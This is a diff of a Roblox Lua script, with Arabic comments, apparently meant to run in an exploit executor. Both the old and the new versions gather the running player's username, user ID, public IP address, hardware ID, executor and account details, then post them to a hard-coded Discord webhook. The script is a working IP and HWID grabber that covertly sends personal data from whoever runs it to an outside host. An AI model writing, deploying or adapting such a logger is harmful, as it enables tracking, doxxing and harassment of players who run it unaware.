@@ -1,58 +1,51 @@
 local http_request = http_request or request or HttpPost or syn.request
 local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
--- جلب اسم الماب
-local gameName = "Unknown"
-pcall(function()
-gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-end)
+local MarketPlace = game:GetService("MarketplaceService")
+
+-- جلب المعلومات الأساسية
+local player = game.Players.LocalPlayer
+local gameName = MarketPlace:GetProductInfo(game.PlaceId).Name
+local playerCount = #game.Players:GetPlayers()
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+local membership = (player.MembershipType == Enum.MembershipType.Premium) and "✅ Yes" or "❌ No"
+
 -- جلب عنوان الـ IP
 local ip_data = "Unknown"
 pcall(function()
-ip_data = game:HttpGet("https://api.ipify.org")
+    ip_data = game:HttpGet("https://api.ipify.org")
 end)
--- جلب معرف الجهاز (HWID)
-local hwid = "Unknown"
-pcall(function()
-hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-end)
--- تحديد نوع المنفذ (Executor)
-local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
--- التحقق من حالة البريميوم
-local premiumStatus = (player.MembershipType == Enum.MembershipType.Premium) and "✅ Yes" or "❌ No"
--- تجهيز مصفوفة البيانات (Embed) بنفس ترتيب الصورة
+
+-- جلب الـ HWID (معرف الجهاز)
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+
 local data = {
-["content"] = nil,
-["embeds"] = {{
-["title"] = "User Information",
-["type"] = "rich",
-["color"] = tonumber(0xff0000), -- اللون الأحمر الجانبي
-["fields"] = {
-{["name"] = "Player Name:", ["value"] = player.Name, ["inline"] = false},
-{["name"] = "Player ID:", ["value"] = tostring(player.UserId), ["inline"] = false},
-{["name"] = "Player Profile:", ["value"] = "https://www.google.com/search?q=https://www.roblox.com/users/" .. player.UserId .. "/profile", ["inline"] = false},
-{["name"] = "Game Name:", ["value"] = gameName, ["inline"] = false},
-{["name"] = "Game URL:", ["value"] = "https://www.roblox.com/games/" .. game.PlaceId, ["inline"] = false},
-{["name"] = "Server JobId:", ["value"] = game.JobId, ["inline"] = false},
-{["name"] = "Players Online:", ["value"] = tostring(#Players:GetPlayers()), ["inline"] = false},
-{["name"] = "Account Age:", ["value"] = tostring(player.AccountAge) .. " days", ["inline"] = false},
-{["name"] = "IP Address:", ["value"] = ip_data, ["inline"] = false},
-{["name"] = "IP Lookup:", ["value"] = "https://whatismyipaddress.com/ip/" .. ip_data, ["inline"] = false},
-{["name"] = "HWID:", ["value"] = hwid, ["inline"] = false},
-{["name"] = "Executor:", ["value"] = executor, ["inline"] = false},
-{["name"] = "Premium:", ["value"] = premiumStatus, ["inline"] = false},
-{["name"] = "Time:", ["value"] = os.date("%d/%m/%Y %H:%M:%S"), ["inline"] = false}
+    ["content"] = nil,
+    ["embeds"] = {{
+        ["title"] = "User Information",
+        ["color"] = 16711680,
+        ["fields"] = {
+            {["name"] = "Player Name:", ["value"] = player.Name, ["inline"] = false},
+            {["name"] = "Player ID:", ["value"] = tostring(player.UserId), ["inline"] = false},
+            {["name"] = "Player Profile:", ["value"] = "https://www.roblox.com/users/"..player.UserId.."/profile", ["inline"] = false},
+            {["name"] = "Game Name:", ["value"] = gameName, ["inline"] = false},
+            {["name"] = "Game URL:", ["value"] = "https://www.roblox.com/games/"..game.PlaceId, ["inline"] = false},
+            {["name"] = "Server JobId:", ["value"] = game.JobId, ["inline"] = false},
+            {["name"] = "Players Online:", ["value"] = tostring(playerCount), ["inline"] = false},
+            {["name"] = "Account Age:", ["value"] = tostring(player.AccountAge).." days", ["inline"] = false},
+            {["name"] = "IP Address:", ["value"] = ip_data, ["inline"] = false},
+            {["name"] = "IP Lookup:", ["value"] = "https://whatismyipaddress.com/ip/"..ip_data, ["inline"] = false},
+            {["name"] = "HWID:", ["value"] = hwid, ["inline"] = false},
+            {["name"] = "Executor:", ["value"] = executor, ["inline"] = false},
+            {["name"] = "Premium:", ["value"] = membership, ["inline"] = false},
+            {["name"] = "Time:", ["value"] = os.date("%d/%m/%Y %H:%M:%S"), ["inline"] = false}
+        }
+    }}
 }
-}}
-}
--- إرسال البيانات إلى الويب هوك
-if http_request then
+
+-- إرسال البيانات
 http_request({
-Url = "https://discord.com/api/webhooks/1484276862141206719/zOcp4uJP04tWBkF-dIzBdIoBytasTcx5spBhTIp9YjddWfL49YwreudJV7aJbxatGjad",
-Method = "POST",
-Headers = {
-["Content-Type"] = "application/json"
-},
-Body = HttpService:JSONEncode(data)
+    Url = "https://discord.com/api/webhooks/1484276862141206719/zOcp4uJP04tWBkF-dIzBdIoBytasTcx5spBhTIp9YjddWfL49YwreudJV7aJbxatGjad",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
